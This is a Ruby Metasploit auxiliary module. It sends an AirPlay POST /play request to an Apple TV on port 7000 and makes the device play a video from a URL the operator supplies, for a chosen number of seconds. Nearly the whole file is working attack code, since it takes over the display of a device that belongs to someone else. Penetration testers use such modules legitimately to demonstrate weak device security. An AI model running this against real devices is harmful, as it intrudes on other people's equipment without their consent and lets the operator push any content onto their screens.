##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'uri'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Apple TV Video Remote Control',
      'Description'   => %q(
        This module plays a video on an AppleTV device. Note that AppleTV can be somewhat picky
        about the server that hosts the video, here are the ones tested: default IIS. default
        Apache, Ruby httpd webrick's default MIME list might need to be updated depending on
        what media file you're playing. Python SimpleHTTPServer is not recommended. Also, if
        you're playing a video, the URL must be an IP address.
      ),
      'Author'        =>
        [
          '0a29406d9794e4f9b30b3c5d6702c708', # Original work
          'sinn3r'                            # More code
        ],
      'References'    =>
        [
          ['URL', 'http://nto.github.io/AirPlay.html']
        ],
      'License'       => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(7000),
      OptInt.new('TIME', [true, 'Time in seconds to show the video', 60]),
      OptString.new('URL', [true, 'URL of video to show. Must use an IP address'])
    ], self.class)

    # We're not actually using any of these against AppleTV in our Rex HTTP client init,
    # so deregister them so we don't overwhelm the user with fake options.
    deregister_options(
      'HTTP::uri_encode_mode', 'HTTP::uri_full_url', 'HTTP::pad_method_uri_count',
      'HTTP::pad_uri_version_count', 'HTTP::pad_method_uri_type', 'HTTP::pad_uri_version_type',
      'HTTP::method_random_valid', 'HTTP::method_random_invalid', 'HTTP::method_random_case',
      'HTTP::uri_dir_self_reference', 'HTTP::uri_dir_fake_relative', 'HTTP::uri_use_backslashes',
      'HTTP::pad_fake_headers', 'HTTP::pad_fake_headers_count', 'HTTP::pad_get_params',
      'HTTP::pad_get_params_count', 'HTTP::pad_post_params', 'HTTP::pad_post_params_count',
      'HTTP::uri_fake_end', 'HTTP::uri_fake_params_start', 'HTTP::header_folding',
      'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2', 'NTLM::SendLM', 'NTLM::SendNTLM',
      'NTLM::SendSPN', 'NTLM::UseLMKey', 'DOMAIN', 'DigestAuthIIS', 'VHOST'
    )
  end


  #
  # Sends a media request to AppleTV. HttpClient isn't used because we actually need to keep
  # the connection alive so that the video can keep playing.
  #
  def send_media_request(opts)
    begin
      http = Rex::Proto::Http::Client.new(
        rhost,
        rport.to_i,
        {
          'Msf' => framework,
          'MsfExploit' => self
        },
        ssl,
        ssl_version,
        proxies,
        datastore['USERNAME'],
        datastore['PASSWORD']
      )

      http.set_config('agent' => datastore['UserAgent'])

      req = http.request_raw(opts)
      res = http.send_recv(req)
      sleep(datastore['TIME']) if res.code == 200
      http.close
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout, Rex::HostUnreachable => e
      fail_with(Failure::Unreachable, e.message)
    ensure
      cleanup
    end
  end


  #
  # Checks the URI datastore option. AppleTV is sort of picky about the URI. It's better to
  # always supply an IP instead of a domain.
  #
  def validate_source!(uri)
    unless Rex::Socket.is_ipv4?(URI(uri).host) # Same trick in target_uri form HttpClient
      raise Msf::OptionValidateError.new(['URL'])
    end
  end


  #
  # Plays a video as a new thread
  #
  def play_video_uri
    uri = datastore['URL']
    validate_source!(uri)

    body  = "Content-Location: #{uri}\n"
    body << "Start-Position: 0.0\n"

    opts = {
      'method'  => 'POST',
      'uri'     => '/play',
      'headers' => {
        'Content-Length' => body.length.to_s,
        'Content-Type'   => 'text/parameters'
      },
      'data'    => body
    }

    # The connection has to stay alive but we don't have to stare at the screen and
    # wait for it to finish.
    framework.threads.spawn("SendMediaRequest", false) {
      send_media_request(opts)
    }
  end


  #
  # Maybe it's just me not understanding the /stop API correctly, but when I send a request to
  # /stop, it doesn't actually do anything. It is sort of possible to stop my video by looking
  # through framework.threads.each {|t| puts t[:tm_name]}, and then kill the right thread. But
  # if there are multiple appletv_display_video running, we don't seem to have a good way to
  # kill the right thread we want. We could kill them all, but we shouldn't do that. So I'll
  # just leave this method here, and then we'll think about how to do it later.
  #
  def stop_play
    raise NotImplementedError
  end


  def run
    print_status("Media request sent. Duration set: #{datastore['TIME']}")
    play_video_uri
  end

end
